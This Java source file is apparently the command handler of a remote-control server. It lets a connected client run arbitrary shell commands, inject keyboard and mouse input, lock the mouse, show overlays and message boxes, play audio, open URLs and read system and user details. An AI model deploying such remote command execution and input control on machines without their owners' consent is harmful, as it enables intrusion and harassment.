package electron.cmd;

import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

import javax.swing.SwingUtilities;

import electron.userThread;
import electron.tweaks.Keyboard;
import electron.tweaks.MouseTweaks;
import electron.tweaks.MusicManager;
import electron.tweaks.OverlayTweak;
import electron.utils.Functions;
import electron.utils.logger;

public class ServerCommands {
	private userThread s;
	public ServerCommands(userThread s) {
		this.s=s;
	}
	
	public boolean executeCommand(String command) throws IOException {
        if(command.equalsIgnoreCase("/help")) {
     	   sendData(" ");
     	   sendData("AVAILABLE INTERNAL COMMANDS:");
     	   sendData("	/ping - check server's state");
     	   sendData("	/sysinfo - get JVM settings");
     	   sendData("	/press <key> - press <key> key");
     	   sendData("	/release <key> - release <key> key");
     	   sendData("	/presskey <key> - press and release <key key>");
     	   sendData("	/clickmouse <btn> - press <btn> btn on mouse");
     	   sendData("	/fixmouse - fix mouse in 0 0 coordinates");
     	   sendData(" 	/player <file.wav> - play wav file <file>");
     	   sendData(" 	/player stop <file> - stop player by filename <file>");
     	   sendData(" 	/player stoplast - stop playing last file <file>");
     	   sendData(" 	/player stopall - stop all playing files");
     	   sendData(" 	/player show - show list of playing files");
     	   sendData(" 	/msg - command in developing");
     	   sendData("	/exit - disconnect from server");
     	   sendData("AVAILABLE MODE COMMANDS:");
     	   sendData(" 	/cmd - toggle cmd mode (All commands will execute in cmd if enabled)");
     	   sendData(" 	/mouse - toggle remote mouse control(Your mouse position will duplicate in remote desktop)");
     	   sendData(" ");
     	   return true;
        }
        //Mouse toggle
        if(command.equalsIgnoreCase("/mouse")) {
     	   s.mouseEn=!s.mouseEn;
     	   sendData("[MOUSE_WORKER]: toggled mouse mode to "+s.mouseEn);
     	  return true;
        }
        //CMD mode toggle
        if(command.equalsIgnoreCase("/cmd")) {
     	   s.cmdEn=!s.cmdEn;
     	   if(s.cmdEn) {
     		   sendData("[CMD]: mode enabled");
     	   }else {
     		   sendData("[CMD]: mode disabled"); 
     	   }
     	  return true;
        }
        //CMD mode executor
        if(s.cmdEn) {
        	boolean fastmode = false;
        	if(command.contains("/fastexec")) {
        		command=command.replace("/fastexec", "");
        		fastmode=true;
        	}
     	   new CMDShell(command,s.client,fastmode).start();
     	  return true;
        }
        //Get system information
        if(command.equalsIgnoreCase("/sysinfo")) {
     	   sendData(" ");
     	   sendData("System information:");
     	   sendData("  OS: "+System.getProperty("os.name"));
     	   sendData("  OS version: "+System.getProperty("os.version"));
     	   sendData("  OS arch: "+System.getProperty("os.arch"));
     	   sendData("  JAVA version: "+System.getProperty("java.version"));
     	   sendData("  User: "+System.getProperty("user.name"));
     	   sendData(" ");
     	   sendData("Hardware information:");
     	   sendData("	Available processors (cores): " + Runtime.getRuntime().availableProcessors());
     	   sendData("	Free memory (bytes): " + Runtime.getRuntime().freeMemory());
     	   sendData("	Total memory available to JVM (bytes): " + 
     		        Runtime.getRuntime().totalMemory());
     	   sendData("");
     	   return true;
        }
        
        //Block mouse
        if(command.equalsIgnoreCase("/fixmouse")) {
     	   if(s.mouseEn) {
     		  sendData("[MOUSE_FIXER]: error: mouse mode already enabled."); 
     		 return true;
     	   }
     	   sendData(MouseTweaks.fixMouse());
     	  return true;
        }
        //Overlay toggle
        if(command.equalsIgnoreCase("/overlay")) {
     	   if(OverlayTweak.isCreated==false) {
     		   OverlayTweak.create();
     		   sendData("[OVERLAY]: created.");
     	   }else {
     		   OverlayTweak.delete();
     		   sendData("[OVERLAY]: closed.");
     	   }
     	   return true;
        }
        //Browse link in default browser
        if(command.toLowerCase().contains("https") || command.toLowerCase().contains("http")) {
         	if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
     		    try {
     				Desktop.getDesktop().browse(new URI(command));
     			} catch (IOException | URISyntaxException e) {
     				sendData("[BROWSE]: error browsing: "+e.getMessage());
     			}
         		return true;
         	}
         }
        
        //Music player
        if(Functions.isMultiCommand("/player", command)) {
     	   String[] args = Functions.getCommandArgs(command);
     	   if(args[1].equalsIgnoreCase("stoplast")) {
     		   sendData(s.musicmgr.stopLast());
     	   }else if(args[1].equalsIgnoreCase("stopall")) {
     		   sendData(MusicManager.stopAll());
     	   }else if(args[1].equalsIgnoreCase("stop")) {
     		   sendData(s.musicmgr.stopName(args[2]));
     	   }else if(args[1].equalsIgnoreCase("show")) {
     		   s.musicmgr.showPlayers();
     	   }else {
     		   sendData(s.musicmgr.play(args[1]));
     	   }
     	  return true;
        }  
        //Messages manager
        if(Functions.isMultiCommand("/msg", command)) {
     	   String[] args = Functions.getCommandArgs(command);
     	   if(args[1].equalsIgnoreCase("show")) {
     		   s.mbox.show();
     	   }else if(args[1].equalsIgnoreCase("close")) {
     		   sendData(s.mbox.close());
     	   }else if(args[1].equalsIgnoreCase("stopall")) {
     		   sendData(s.mbox.stopAll());
     	   }else {
     		   s.mbox.callMessageBox(args[4].replaceAll("_", " "), args[3], args[1], args[2]);
     	   }
     	   return true;
        }
        
        if(Functions.isMultiCommand("/press", command)) {
      	   String[] args = Functions.getCommandArgs(command);
      	   Keyboard.press(Keyboard.getKeyCode(args[1]));
      	   sendData("[KEYBOARD]: pressed key "+args[1]);
      	   return true;
        }
        if(Functions.isMultiCommand("/release", command)) {
       	   String[] args = Functions.getCommandArgs(command);
       	   Keyboard.release(Keyboard.getKeyCode(args[1]));
       	   sendData("[KEYBOARD]: released key "+args[1]);
       	   return true;
         }
        if(Functions.isMultiCommand("/presskey", command)) {
        	String[] args = Functions.getCommandArgs(command);
        	Keyboard.press(Keyboard.getKeyCode(args[1]));
        	Keyboard.release(Keyboard.getKeyCode(args[1]));
        	sendData("[KEYBOARD]: pressed and released key "+args[1]);
        	return true;
        }
		return false;
	}
	
	
	
	private void sendData(String msg) throws IOException {s.sendData(msg);}
}
